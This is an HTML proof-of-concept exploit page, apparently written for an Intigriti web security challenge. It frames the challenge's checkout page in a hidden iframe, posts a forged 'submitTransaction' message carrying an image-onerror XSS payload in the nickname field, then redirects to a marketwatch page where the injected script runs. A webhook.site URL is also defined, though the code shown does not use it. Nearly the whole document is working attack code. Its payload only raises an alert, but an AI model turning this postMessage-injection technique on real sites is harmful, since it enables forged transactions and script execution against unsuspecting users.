<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<pre id=log>Loading...</pre>
<iframe id=x src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style=display:none></iframe>
<script>
const WEBHOOK = 'https://webhook.site/eee63a07-177d-4efd-8528-790a669c7cfa';
const WALLET = '16472226db03703a192aa383237035a69f';
const log = document.getElementById('log');

function msg(s) { log.textContent += '\n' + s; console.log(s); }

document.getElementById('x').onload = () => {
    msg('[+] Iframe loaded');

    setTimeout(() => {
        msg('[+] Sending postMessage...');

        document.getElementById('x').contentWindow.postMessage({
            type: 'submitTransaction',
            transaction: {
                toAddress: WALLET,
                currency: '1337COIN',
                amount: 1,
                nickname: '<img src=x onerror="alert(\'gigawatz\')">'
            }
        }, '*');

        msg('[+] Payload sent!');
        msg('[+] Wallet: ' + WALLET);

        setTimeout(() => {
            msg('[+] Redirecting to marketwatch...');
            window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
        }, 2000);
    }, 2000);
};
</script>
</body>
</html>
